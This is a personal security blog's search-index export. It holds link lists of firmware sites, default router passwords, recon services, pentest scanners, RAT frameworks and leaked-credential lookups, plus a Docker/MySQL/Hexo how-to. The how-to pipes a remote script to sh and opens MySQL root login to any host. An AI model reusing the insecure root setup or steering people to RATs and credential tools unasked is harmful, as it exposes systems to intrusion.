<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>IoT Resources</title>
    <url>/2018/10/01/2018-09-31-IoT-Resources/</url>
    <content><![CDATA[<h2 id="Firmware-Sites"><a href="#Firmware-Sites" class="headerlink" title="Firmware Sites"></a>Firmware Sites</h2><ul>
<li><code>D-Link</code> has <a class="link"   href="https://support.dlink.com/index.aspx" >support.dlink.com<i class="fas fa-external-link-alt"></i></a>, <a class="link"   href="https://tsd.dlink.com.tw/ddwn" >tsd.dlink.com.tw<i class="fas fa-external-link-alt"></i></a> and <a class="link"   href="https://ftp.dlink.de/" >ftp.dlink.de<i class="fas fa-external-link-alt"></i></a>, and another <a class="link"   href="ftp://ftp2.dlink.com/SECURITY_ADVISEMENTS/" >ftp site<i class="fas fa-external-link-alt"></i></a></li>
<li><code>TP-Link</code> has <a class="link"   href="https://www.tp-link.com/us/support/download/" >www.tp-link.com<i class="fas fa-external-link-alt"></i></a> ( <a class="link"   href="https://www.tp-link.com/us/support/download/" >www.tp-link.com/us/<i class="fas fa-external-link-alt"></i></a>, <a class="link"   href="https://www.tp-link.com/no/support/download/" >www.tp-link.com/no/<i class="fas fa-external-link-alt"></i></a>, <a class="link"   href="https://www.tp-link.com/en/support/download/" >www.tp-link.com/en/<i class="fas fa-external-link-alt"></i></a> and so on)</li>
<li><a class="link"   href="https://www.trendnet.com/support/" >TRENDnet<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://www.tendacn.com/en/service/download.html" >Tenda<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://fw.draytek.com.tw/" >DrayTek<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://dd-wrt.com/" >DD-WRT<i class="fas fa-external-link-alt"></i></a>: a Linux based alternative OpenSource firmware suitable for a great variety of WLAN routers and embedded systems.</li>
</ul>
<h2 id="Router-Password-Websites"><a href="#Router-Password-Websites" class="headerlink" title="Router Password Websites"></a>Router Password Websites</h2><ul>
<li><a class="link"   href="http://www.routerpasswords.com/" >Router Passwords Community Database - The Wireless Router Experts<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://portforward.com/router-password/" >Router Passwords<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://www.cleancss.com/router-default/" >Default Router Login, Passwords and IP Addresses<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://cirt.net/passwords" >Default Passwords | CIRT.net<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://bestvpn.org/default-router-passwords/" >Default Router Passwords | BestVPN.org<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://toolmao.com/baiduapp/routerpwd/" >路由器默认密码查询<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://datarecovery.com/rd/default-passwords/" >List of Default Passwords<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://www.ifm.net.nz/cookbooks/passwordcracker.html" >Cisco Password Cracker<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<h2 id="IoT-Papers"><a href="#IoT-Papers" class="headerlink" title="IoT Papers"></a>IoT Papers</h2><p>Check this <a class="link"   href="https://github.com/0xricksanchez/paper_collection" >paper_collection<i class="fas fa-external-link-alt"></i></a> for fuzzing, binary analysis, IoT security, and general exploitation related papers.</p>
]]></content>
      <categories>
        <category>List</category>
      </categories>
      <tags>
        <tag>list</tag>
        <tag>IoT</tag>
        <tag>pwn</tag>
        <tag>paper</tag>
      </tags>
  </entry>
  <entry>
    <title>Resource Lists</title>
    <url>/2018/10/01/2018-09-31-Resource-Lists/</url>
    <content><![CDATA[<h2 id="Online-Malware-Scanner"><a href="#Online-Malware-Scanner" class="headerlink" title="Online Malware Scanner"></a>Online Malware Scanner</h2><p>Virus:</p>
<ul>
<li><a class="link"   href="https://www.virscan.org/" >VirSCAN<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://www.virustotal.com/gui/" >VirusTotal<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://virusscan.jotti.org/" >Jotti<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://www.scanvir.com/" >ScanVir<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<p>Ransomware Scanner: </p>
<ul>
<li><a class="link"   href="https://guanjia.qq.com/pr/ls/" >Tencent<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://lesuobingdu.360.cn/" >360<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://lesuo.venuseye.com.cn/" >Venustech<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://lesuobingdu.qianxin.com/" >QIANXIN<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://edr.sangfor.com.cn/#/information/ransom_search" >Sangfor<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://malapi.io/" >Malware API list<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/stuhli/awesome-event-ids" >Awesome Event IDs<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<p>Ransomware Decryption:</p>
<ul>
<li><a class="link"   href="https://habo.qq.com/tool/index" >Tencent HABO Tools<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://www.duba.net/dbt/wannacry.html" >金山毒霸<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://bbs.huorong.cn/forum-55-1.html" >Huorong<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://it.rising.com.cn/fanglesuo/index.html" >瑞星<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://www.nomoreransom.org/zh/index.html" >nomoreransom<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://id-ransomware.malwarehunterteam.com/" >MalwareHunterTeam<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://noransom.kaspersky.com/" >Kaspersky<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://www.avast.com/ransomware-decryption-tools" >Avast<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://www.emsisoft.com/ransomware-decryption-tools/free-download" >Emsisoft<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/jiansiting/Decryption-Tools" >from github<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<p>Online Sandbox:</p>
<ul>
<li><a class="link"   href="https://app.any.run/" >Any.Run<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://s.threatbook.cn/" >ThreatBook Cloud Sandbox<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://www.virustotal.com/gui/" >VirusTotal<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://www.joesandbox.com/" >Joe Sanbox<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://habo.qq.com/" >Tencent HABO Index<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://ata.360.cn/detection" >360沙箱云<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://sandbox.ti.qianxin.com/sandbox/page" >奇安信沙箱<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://sandbox.depthsec.com.cn/index.php/" >微点沙箱<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://www.maldun.com/analysis/" >魔盾安全分析<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://mac-cloud.riskivy.com/" >大圣云沙箱<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<h2 id="Online-Infomation-Gathering"><a href="#Online-Infomation-Gathering" class="headerlink" title="Online Infomation Gathering"></a>Online Infomation Gathering</h2><p>Assets:</p>
<ul>
<li><a class="link"   href="https://who.is/" >whois<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://whois.chinaz.com/" >whois(ChinaZ)<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://whois.aliyun.com/" >WHOIS from aliyun<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://www.zoomeye.org/" >ZoomEye<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://www.shodan.io/" >Shodan<i class="fas fa-external-link-alt"></i></a><ul>
<li><a class="link"   href="https://internetdb.shodan.io/" >InternetDB API<i class="fas fa-external-link-alt"></i></a></li>
</ul>
</li>
<li><a class="link"   href="https://fofa.so/" >FOFA<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://censys.io/" >Censys<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://quake.360.net/quake/#/index" >360 quake<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://www.tianyancha.com/" >天眼查 查企业&#x2F;子公司&#x2F;域名&#x2F;公众号<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://aiqicha.baidu.com/" >爱企查<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://www.qcc.com/" >企查查询<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://www.qixin.com/" >启信宝<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<p>Fingerprints:</p>
<ul>
<li><a class="link"   href="https://scan.dyboy.cn/web/" >ThreatScan<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://www.yunsee.cn/" >yunsee<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<p>Tools:</p>
<ul>
<li><a class="link"   href="https://www.ipaddress.com/" >IPAddress.com<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://ping.chinaz.com/" >Ping(ChinaZ.com)<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://ping.aizhan.com/" >Ping(aizhan)<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://dns.aizhan.com/=" >DNS(aizhan)<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://coolaf.com/tool/port" >Port scan(PostJson)<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://coolaf.com/tool/gp" >Online get &amp; post(PostJson)<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://z.zcjun.com/" >Subdomain1<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://phpinfo.me/domain/" >Subdomain2<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://spyse.com/tools/subdomain-finder" >Subdomain Finder<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://www.webscan.cc/" >Webscan1<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://c.webscan.cc/" >Webscan2<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://www.ipip.net/" >IP geometry<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://www.robtex.com/" >Robtex<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://sitereport.netcraft.com/?url=" >Netcraft<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://dnsdumpster.com/" >DNSdumperster<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://whois.domaintools.com/" >DomainTools<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://www.whoxy.com/" >WHOXY<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://chapangzhan.com/" >查旁站<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://site.ip138.com/" >ip138<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<p>Toolsets:</p>
<ul>
<li><a class="link"   href="http://coolaf.com/" >PostJson<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://tool.chinaz.com/" >ChinaZ tools<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://www.atoolbox.net/" >A toolbox<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://tool.lu/" >Another toolbox<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://c.runoob.com/" >Runoob toolbox<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://www.gjw123.com/" >Toolsite updating<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://tools.webservertalk.com/" >WEB SERVER TALK - DNS &amp; WHOIS Tools &amp; Utilities<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://www.domainiq.com/tools" >domainIQ<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://viewdns.info/" >ViewDNS.info<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://ctf.ssleye.com/" >ctf tools<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://tools.ipip.net/" >ipip<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://www.yougetsignal.com/" >you get signal<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<h2 id="Pentest"><a href="#Pentest" class="headerlink" title="Pentest"></a>Pentest</h2><p>Information gathering:</p>
<ul>
<li><a class="link"   href="https://github.com/OWASP/Amass" >OWASP Amass Project<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/OJ/gobuster" >Gobuster<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/TophantTechnology/ARL" >ARL(Asset Reconnaissance Lighthouse)<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/0x727/ShuiZe_0x727" >Shuize水泽<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/knownsec/Kunyu" >Kunyu(坤舆)<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/EASY233/Finger" >Finger<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/shmilylty/OneForAll" >OneForAll<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/six2dez/reconftw" >ReconFTW<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/P1-Team/AlliN" >ALLiN<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/0x727/ObserverWard" >ObserverWard<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/yogeshojha/rengine" >reNgine<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/TideSec/TideFinger" >TideFinger<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/Acmesec/Sylas" >Sylas<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/bit4woo/teemo" >teemo<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/projectdiscovery/naabu" >naabu<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/m3n0sd0n4ld/GooFuzz" >GooFuzz<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<p>Vuln Scanner:</p>
<ul>
<li><a class="link"   href="https://github.com/google/tsunami-security-scanner" >Tsunami<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/projectdiscovery/nuclei" >Nuclei<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/hktalent/scan4all" >scan4all<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/lcvvvv/kscan" >Kscan<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/k8gege/LadonGo" >Ladon Scanner For Golang<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/Adminisme/ServerScan" >ServerScan<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/zhzyker/vulmap" >Vulmap<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/i11us0ry/goon" >goon<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/u21h2/nacs" >nacs: event-driven pentest scanner<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/1n7erface/RequestTemplate" >RequestTemplate<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/ExpLangcn/Aopo" >Aopo<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/EdgeSecurityTeam/EHole" >EHole<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/RustScan/RustScan" >RustScan<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<p>Toolsets</p>
<ul>
<li><a class="link"   href="http://localhost:4000/categories/Penetration-Testing/" >My column in this site<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/knownsec/404StarLink" >404 StarLink Project<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://forum.ywhack.com/center.php" >forum from EdgeSecurityTeam<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/edoardottt/awesome-hacker-search-engines" >Awesome Hacker Search Engines<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/projectdiscovery" >ProjectDiscovery<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/yaklang/yakit" >YAKIT<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://gobies.org/" >Goby<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/chaitin/xray" >xray<i class="fas fa-external-link-alt"></i></a> and <a class="link"   href="https://github.com/chaitin/rad" >rad<i class="fas fa-external-link-alt"></i></a> from <a class="link"   href="https://github.com/chaitin" >chaitin<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<p>RAT framework</p>
<ul>
<li><a class="link"   href="https://github.com/NYAN-x-CAT/AsyncRAT-C-Sharp" >AsyncRAT<i class="fas fa-external-link-alt"></i></a>(by <a class="link"   href="https://github.com/NYAN-x-CAT?tab=repositories" >NYAN CAT<i class="fas fa-external-link-alt"></i></a>)</li>
<li><a class="link"   href="https://github.com/HavocFramework/Havoc" >Havoc<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/b23r0/Heroinn" >Heroinn<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/BishopFox/sliver-gui" >Silver GUI<i class="fas fa-external-link-alt"></i></a> (<a class="link"   href="https://github.com/BishopFox/sliver" >Silver<i class="fas fa-external-link-alt"></i></a>)</li>
<li><a class="link"   href="https://github.com/lu4p/ToRat" >ToRat<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/Nikait/GoRAT" >GoRAT<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/EmpireProject/Empire" >Empire<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/malwaredllc/byob" >byob<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://github.com/n1nj4sec/pupy" >Pupy<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<p>Remote Access</p>
<ul>
<li><a class="link"   href="https://www.teamviewer.com/en/" >TeamViewer<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://www.todesk.com/" >ToDesk<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://sunlogin.oray.com/download?categ=personal" >Sunlogin<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://gotohttp.com/" >GotoHTTP<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://rustdesk.com/" >RustDesk<i class="fas fa-external-link-alt"></i></a></li>
</ul>
<h2 id="Password-Leaking"><a href="#Password-Leaking" class="headerlink" title="Password Leaking"></a>Password Leaking</h2><ul>
<li><a href="https://passwords.google.com/intro"><code>Google</code> password manager</a></li>
<li><a class="link"   href="https://monitor.firefox.com/" >Firefox Monitor<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://haveibeenpwned.com/" >have i been pwned?<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://intelx.io/" >Intelligence X<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://aleph.occrp.org/" >Aleph<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://www.dehashed.com/" >dehashed<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://isleaked.com/" >IsLeaked<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://snusbase.com/" >snusbase<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://checkusernames.com/" >checkusernames<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://knowem.com/" >KnowEm<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="http://vigilante.pw/" >vigilante<i class="fas fa-external-link-alt"></i></a></li>
<li><a class="link"   href="https://www.reg007.com/" >REG007<i class="fas fa-external-link-alt"></i></a></li>
</ul>
]]></content>
      <categories>
        <category>List</category>
      </categories>
      <tags>
        <tag>list</tag>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>First how-to-do note</title>
    <url>/2018/10/21/2018-10-21-First-how-to-do-note/</url>
    <content><![CDATA[<p>This is the first note. It’s about how to use mysql in docker, how to use hexo to build blog and post it on Github using Pages.</p>
<h2 id="First-how-to-do-note（mysql-with-docker、hexo）"><a href="#First-how-to-do-note（mysql-with-docker、hexo）" class="headerlink" title="First how-to-do note（mysql with docker、hexo）"></a>First how-to-do note（mysql with docker、hexo）</h2><p>Due to my project in college, I have to migrate the <code>MYSQL 5.5</code> environment to <code>MYSQL 8.0</code> version on my cloud hosting, but with a problem that I ccouldn’t start my <code>mysql.service</code> correctly ,I decided to deploy <code>mysql</code> with <code>docker</code> and learning basic <code>docker</code> using skills in the meantime.<br>By the way I have forgotten how to build my GitHub Pages with <code>hexo</code>, and this time I will give it a summary.</p>
<h2 id="Basic-Steps-for-MySQL-Server-Deployment-with-Docker"><a href="#Basic-Steps-for-MySQL-Server-Deployment-with-Docker" class="headerlink" title="Basic Steps for MySQL Server Deployment with Docker"></a>Basic Steps for MySQL Server Deployment with Docker</h2><h3 id="Basic-Usage"><a href="#Basic-Usage" class="headerlink" title="Basic Usage"></a>Basic Usage</h3><p>first you need to install <code>docker</code> and test it (using root on debian)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ apt update </span><br><span class="line">$ apt install docker <span class="comment"># &quot;wget -qO- https://get.docker.com/ | sh&quot;, to get the newest </span></span><br><span class="line">$ apt install docker.io <span class="comment"># turns out to be useful, while the one above does not...</span></span><br><span class="line">$ systemctl start docker <span class="comment"># or service docker start, to start service</span></span><br><span class="line">$ docker run hello-world <span class="comment"># docker-style hello-world to check your install</span></span><br></pre></td></tr></table></figure>
<p>some usages</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># show help</span></span><br><span class="line">$ docker / docker xxx --<span class="built_in">help</span></span><br><span class="line"><span class="comment"># show images on localhost </span></span><br><span class="line">$ docker images / docker image ls</span><br><span class="line"><span class="comment"># show running containers </span></span><br><span class="line">$ docker ps [-a] / docker container ls</span><br><span class="line"><span class="comment"># search images xxx</span></span><br><span class="line">$ docker search xxx</span><br><span class="line"><span class="comment"># get what you want</span></span><br><span class="line">$ docker pull xxx</span><br><span class="line"></span><br><span class="line"><span class="comment"># if you have a specific target like me, only one step to get the image</span></span><br><span class="line">$ docker run --name=mysqlxxx -p 33060:3306 -d mysql/mysql-server:tag</span><br><span class="line"><span class="comment"># &#x27;--name=mysqlxxx&#x27; means name it &amp; call it by name, rather than by calling its long random id string</span></span><br><span class="line"><span class="comment"># &#x27;-d&#x27; means run it in the background</span></span><br><span class="line"><span class="comment"># &#x27;-p 33060:3306&#x27; to bind local port 33060 with docker&#x27;s 3306 port</span></span><br><span class="line"><span class="comment"># notice:tag should be replaced with 5.5/5.6/5.7/8.0/8.0.x(x-&gt;latest)...</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Dockerfile usage</span></span><br><span class="line"><span class="comment"># to build your own docker image</span></span><br><span class="line"><span class="comment"># please search how to write Dockerfile, then</span></span><br><span class="line">$ docker build -t xxx .</span><br><span class="line"><span class="comment"># &#x27;-t&#x27; to assign name of image </span></span><br><span class="line"><span class="comment"># the &#x27;.&#x27; at the tail indicate location of Dockerfile</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#to delete</span></span><br><span class="line">$ docker stop containerID</span><br><span class="line">$ docker rm containerID</span><br><span class="line">$ docker rmi imageID</span><br></pre></td></tr></table></figure>
<h3 id="About-MYSQL"><a href="#About-MYSQL" class="headerlink" title="About MYSQL"></a>About MYSQL</h3><p>then we have a mysql docker, can be accessed by localhost:33060, but some configurations are needed</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># this step is to see original password </span></span><br><span class="line">$ docker logs mysqlxxx 2&gt;&amp;1 | grep GENERATED <span class="comment"># logs to see logs</span></span><br><span class="line"><span class="comment"># outputs like ↓</span></span><br><span class="line">GENERATED ROOT PASSWORD: Axegh3kAJyDLaRuBemecis&amp;EShOs</span><br><span class="line"></span><br><span class="line"><span class="comment"># login mysql first</span></span><br><span class="line">$ docker <span class="built_in">exec</span> -it mysqlxxx mysql -uroot -p </span><br><span class="line"><span class="comment"># &#x27;-it&#x27; usually combined to get interact with dockers, with commands follow</span></span><br><span class="line"><span class="comment"># &#x27;mysql -uroot -p&#x27; is the example</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># change password</span></span><br><span class="line">mysql&gt; ALTER USER <span class="string">&#x27;root&#x27;</span>@<span class="string">&#x27;localhost&#x27;</span> IDENTIFIED BY <span class="string">&#x27;password&#x27;</span>;</span><br><span class="line"><span class="comment"># or commands in docker shell</span></span><br><span class="line">$ docker -it mysqlxxx /bin/bash </span><br><span class="line">$ mysqladmin -uroot -p password newpassword</span><br><span class="line"></span><br><span class="line"><span class="comment"># then open remote connection permit</span></span><br><span class="line">mysql&gt; use mysql;</span><br><span class="line">mysql&gt; update user <span class="built_in">set</span> host = <span class="string">&#x27;%&#x27;</span> <span class="built_in">where</span> user = <span class="string">&#x27;root&#x27;</span>; </span><br></pre></td></tr></table></figure>
<p>Now we have a mysql docker which can be accessed remotely</p>
<h2 id="GitHub-Pages-with-Hexo"><a href="#GitHub-Pages-with-Hexo" class="headerlink" title="GitHub Pages with Hexo"></a>GitHub Pages with Hexo</h2><h3 id="Using-Hexo"><a href="#Using-Hexo" class="headerlink" title="Using Hexo"></a>Using Hexo</h3><p>Node.js is required, and Git is required on Windows</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ npm install hexo -g <span class="comment"># use npm </span></span><br><span class="line">$ hexo init blogname <span class="comment"># initial blog</span></span><br><span class="line">$ <span class="built_in">cd</span> blogname <span class="comment"># enter blog directory</span></span><br><span class="line">$ hexo server <span class="comment"># start hexo as a server and you&#x27;ll see hexo-style hello-world</span></span><br></pre></td></tr></table></figure>
<p>directory structure</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">.</span><br><span class="line">├── .deploy</span><br><span class="line">├── public  //to publish your html </span><br><span class="line">├── scaffolds</span><br><span class="line">├── scripts</span><br><span class="line">├── source</span><br><span class="line">|   ├── _drafts  </span><br><span class="line">|   └── _posts  //md files to be generated as html</span><br><span class="line">├── themes  //themes&#x27; conf is _config.yml in this dir</span><br><span class="line">├── _config.yml  //blog&#x27;s configure</span><br><span class="line">└── package.json</span><br></pre></td></tr></table></figure>
<p>common usages</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new passagename <span class="comment"># create passagename.md in source/_posts/</span></span><br><span class="line">$ hexo new page pagename <span class="comment"># create pagename.html maybe</span></span><br><span class="line">$ hexo generate <span class="comment"># *.md are generated to be *.html</span></span><br><span class="line">$ hexo deploy <span class="comment"># deploy your blog on github</span></span><br></pre></td></tr></table></figure>
<p>simplify:</p>
<pre><code>hexo n == hexo new
hexo g == hexo generate
hexo s == hexo server
hexo d == hexo deploy
</code></pre>
<p>combine:</p>
<pre><code>$ hexo deploy -g
$ hexo server -g
$ hexo d -g
$ hexo s -g
</code></pre>
<h3 id="GitHub-Part"><a href="#GitHub-Part" class="headerlink" title="GitHub Part"></a>GitHub Part</h3><ol>
<li><p>first you need a <code>github</code> account</p>
</li>
<li><p>then create a repository named : <code>xxx.github.io</code> (xxx &#x3D;&gt; <code>github</code> username)</p>
</li>
<li><p>configure your ssh public-key to login <code>github</code> without password (necessary for windows git)</p>
</li>
</ol>
<ul>
<li>configure git’s username &amp; email (ensure your updates show on the wall)<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ git config --global user.name <span class="string">&quot;your GitHub username&quot;</span></span><br><span class="line">$ git config --global user.email <span class="string">&quot;your GitHub mailaddress&quot;</span></span><br></pre></td></tr></table></figure></li>
<li>check out whether you have public&#x2F;private keys<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">$ <span class="built_in">cd</span> ~/.ssh</span><br><span class="line">$ ls </span><br><span class="line"><span class="comment"># things may look like ...</span></span><br><span class="line">authorized_keys2  id_rsa       known_hosts</span><br><span class="line">config            id_rsa.pub</span><br></pre></td></tr></table></figure></li>
<li>if you can see <code>xxx</code> and <code>xxx.pub</code>, it means u got a keypair</li>
